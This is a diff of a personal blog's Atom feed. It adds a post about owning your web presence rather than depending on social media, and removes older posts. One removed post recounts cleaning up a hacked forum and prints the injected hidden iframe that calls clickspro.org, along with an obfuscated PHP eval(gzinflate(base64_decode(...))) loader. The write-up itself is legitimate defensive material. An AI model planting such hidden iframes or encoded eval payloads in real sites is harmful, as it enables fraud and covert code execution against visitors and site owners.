@@ -4,7 +4,7 @@
   <title><![CDATA[Category: agalmic | DV Digital]]></title>
   <link href="http://www.dan-vidal.com//blog/categories/agalmic/atom.xml" rel="self"/>
   <link href="http://www.dan-vidal.com//"/>
-  <updated>2012-11-07T02:53:44-05:00</updated>
+  <updated>2012-11-09T12:37:51-05:00</updated>
   <id>http://www.dan-vidal.com//</id>
   <author>
     <name><![CDATA[Dan Vidal - Pod]]></name>
@@ -12,6 +12,38 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[I'm a social media sceptic and I have a blog...]]></title>
+    <link href="http://www.dan-vidal.com//blog/2012/11/09/im-a-social-media-sceptic-and-i-have-a-blog-dot-dot-dot/"/>
+    <updated>2012-11-09T11:44:00-05:00</updated>
+    <id>http://www.dan-vidal.com//blog/2012/11/09/im-a-social-media-sceptic-and-i-have-a-blog-dot-dot-dot</id>
+    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/blog-5407.jpg" width="960" height="640" title="'OCP'" ></p>
+
+<p>This morning, when I woke up, a post on Facebook by <a href="http://helloimscott.com/">Scott Alexander</a> caught my eye.</p>
+
+<p><blockquote><p>A good article for photographers and artists of any medium, really. While you're on Edin's site reading this, I highly recommend checking out the rest of his site. Great photographer with a superb eye.</p></p><p><p></p><footer><strong>Scott Alexander</strong> <cite>A Facebook Post</cite></footer></blockquote></p>
+
+<!-- more -->
+
+
+<p>The post linked to <a href="http://www.edinchavez.com/blog/why-should-i-start-a-blog/">an article by local photographer Edin Chavez</a>, on why a photographer should have a blog. The reasons are pretty obvious, ranging from showcasing your work to SEO, and, most importantly, <em>control</em>.</p>
+
+<p>Now, maybe it sounds a little obsessive, but at the end of the day, having a slice of web property you control from top to bottom is important, especially if you are in the creative field. And, unfortunately, there's quite a large amount of creative types who don't have a web property that they explicitly have ownership of. I know more than a few working photographers who only use social media to showcase their works, for example. This can be dangerous.</p>
+
+<p>I'm a "social media sceptic". I've been on the internet in one way or another since 1992, around the time the World Wide Web was born. And yes, there was an <a href="http://www.dan-vidal.com/blog/2012/08/22/how-it-was/">internet before then</a>. My dad was/is a network engineer, so we always had some form of basic online access. In general, we passed on the walled-garden online services of the day like AOL, Compu$erve, and so on. I actually preferred local dialup BBSes, which, in a way, were primitive social networks.</p>
+
+<p>You could post up content, chat with other users, and transfer files around. It was basically a text-mode Facebook, if you think about it. However, after a few years, the era of the BBS faded, replaced by easy internet access and the rise of consumer usage of the WWW. Once people got situated and used to "dot com", soon after came the rise of user-provided content, i.e. the first blogs. Blogging was around before the term was coined (a lot of personal websites had a running journal of the owner's thoughts...), but with the advent of primitive <a href="http://www.movabletype.org/">CMS</a> systems, publishing content became a trivial point and shoot exercise. Then, of course, that was extended into social networking as we know it. Friendster kicked off the craze, then MySpace, then proceeding on to Twitter and Facebook, with of course Google constantly on the move to be "the" internet.</p>
+
+<p>However, through all those trends and sea changes, the ability to host and publish your own content on your own web property has remained. I know a few "social media managers" (the title is largely meaningless), and their biggest challenge is keeping up with the trends in services and platforms. Today it is Facebook, tomorrow it could (hopefully) be <a href="http://join.app.net/">app.net</a>, or a move to the <a href="https://joindiaspora.com/">Diaspora</a> model of community-run distributed social networking. Nonetheless, it's a lot to digest and keep up with. It's the nature of the beast, as it were.</p>
+
+<p>And therein lies the problem. I see a lot of people who rely and base their businesses on a specific form of social media. A few years ago, I knew people who made businesses based on doing MySpace profile templates, and they acted as if it was their gateway to untold riches. Now, you have companies building applications around Facebook, acting in much the same way. With the cyclical trendy nature of social media, most of these companies are destined to fail, or disappear, due to their reliance on someone else's platform for their business. It's akin to relying on General Motors cars exclusively for your delivery business, rather than any operational vehicle.</p>
+
+<p>Now, one could drive themselves crazy keeping up with these social media trends. Every so often, you have to convert and repost your content. One bulwark against that, (to bring it all home!), is having your own web property. Now, <a href="http://www.edinchavez.com/blog/why-should-i-start-a-blog/">Edin espouses Wordpress and/or Blogger</a> as a publishing platform, and I of course champion <a href="http://octopress.org/">Octopress</a>, but that battle is more of a technical one than a political one.</p>
+
+<p>The key is, hosting your content on your own systems, and using social media to drive people to those systems. I know with Octopress it will be a trivial matter to write a plug-in to support broadcasting to any future social network, due to it's open-source nature. And even though Wordpress is rather closed in comparison, some enterprising developer will link WP with whichever future social network becomes ascendent. But, at the end of the day, with having your own domain, own hosting, and own content, one can make themselves immune from the often-flaky, trendy, and chaotic world of social media.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[The virtues of open-source...]]></title>
@@ -179,131 +211,6 @@
 <p>A third option exists, for the truly hardcore mobile audiophiles, the <a href="http://v-moda.com/vamp/">VAMP by V-MODA</a>. I had the pleasure during the 2009 Tiësto tour to spend time with Val Kolton, the founder of V-MODA, and he definitely takes his audio seriously. The Vamp reflects this. It's an external DAC/amplifier for the iPhone/iPod, and also acts as a battery too. However, at $600, it's a little rich for my blood. And there's no model for the iPhone 5 yet. I may live a little and consider it after I upgrade, it seems like a badass option, and there are occasions where I'm around the apt and not wanting to disturb the neighbors with my speakers, but I do want mobility. Or for when I'm on a plane and have a pair of 7509s. I love the concept, but I'll reserve judgement until they roll one for the 5.</p>
 
 <p>But, for those of us on a budget, a good pair of earbuds, and the EQu app are a great combo for when you're on the go. It's just too bad you have to spend extra money, whether it's for a head unit in your car with a USB port, the combination of EQu and a decent pair of earbuds, or going full-throttle with a VAMP, to get decent audio out of your iDevice. Apple has the chops in pro audio, it should trickle down to their iDevices. At the least, give us a systemwide graphic equalizer.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
-    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
-    <updated>2012-09-27T23:34:00-04:00</updated>
-    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
-    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>
-
-<p>Every so often, websites are hacked. Sometimes it's bad, sometimes it's harmless. The usual goal is to infect a viewer's computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of "harmless", are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>
-
-<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can't trust them...</p>
-
-<!-- more -->
-
-
-<p>Why not?</p>
-
-<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it's cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don't add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to "peer over the walls", as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it's hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>
-
-<p>So, people invariably get in.</p>
-
-<p>I first noticed something was amiss when I could not login to the forum's administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser's status bar. The redirects were pointing towards a site called "clickspro.org". Now, since I helped build TNL, I know each and every aspect of it's functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it's been over three years since TNL has explicitly seen any new features.</p>
-
-<p>So, I started a little investigating.</p>
-
-<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>
-
-<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn't. I used the UNIX tool "cURL" to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>
-
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p>This rendered the admin control panel for TNL in it's raw HTML format. Therein, I spotted the offending code:</p>
-
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p>That does not belong.</p>
-
-<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>
-
-<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>
-
-<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn't find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>
-
-<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>
-
-<p><blockquote><p></p></p><p><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p></p><p><p></p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote></p>
-
-<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>K/5DdO/p8AAAD//w==')));?>&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I'm not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don't know what USENET is, Google it.</p>
-
-<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.
-<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure></notextile></div></p>
-
-<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>
-
-<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>
-
-<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>
-
-<p>What mystifies me though, and I'm finally getting to the point of this rant, is that to implement this, it took some doing. This wasn't a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>
-
-<p>A lot of effort, for little return. Clicks, likes, and impressions. It's all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it's an ecommerce site, are people buying anything? If it's a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>
-
-<p>It's sad that people actually pay for this sort of thing. It's why my tactic with regards to web properties I don't explicitly own or have control over is to get people off them as fast as possible. I'll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don't harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I'd rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I'm the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don't play the stats game. I've opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>
-
-<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn't find it so, it's really annoying.</p>
-
-<p>Give me the real data and content.</p>
-
-<p>And to the kid in Manila? Sorry about that. I know you're just doing your job, and it's better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>
-
-<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
 ]]></content>
   </entry>
   
